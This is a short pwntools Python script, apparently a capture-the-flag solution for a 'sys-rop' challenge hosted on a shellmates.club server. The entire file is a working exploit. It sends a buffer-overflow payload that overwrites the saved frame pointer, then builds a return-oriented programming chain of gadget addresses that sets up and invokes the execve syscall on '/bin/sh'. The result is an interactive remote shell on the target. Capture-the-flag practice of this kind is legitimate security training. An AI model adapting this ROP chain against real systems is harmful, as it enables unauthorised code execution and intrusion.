from pwn import *
context.binary=exe=ELF("./chall",checksec=False)
#libc=ELF("./libc.so.6",checksec=False)

#p=process(exe.path)
p=remote("sys-rop.bsides.shellmates.club" ,443,ssl=True)

def GDB():
	gdb.attach(p,gdbscript= 
		'''
		'''
		)
	input()
#GDB()
pop_rax=0x0000000000401085
pop_rsi=0x0000000000401081
pop_rdi=0x000000000040107f
pop_rdx=0x0000000000401083
syscall=0x000000000040100a
offset=0x58
binsh=0x402010
payload=b"A"*0x50+p64(0x00000000402a00)
payload+=flat(	
	pop_rax,0x3b,
	pop_rdi,binsh,
	pop_rdx,0,
	pop_rsi,0,
	syscall
	)
p.sendlineafter(b"message: ",payload)

p.interactive()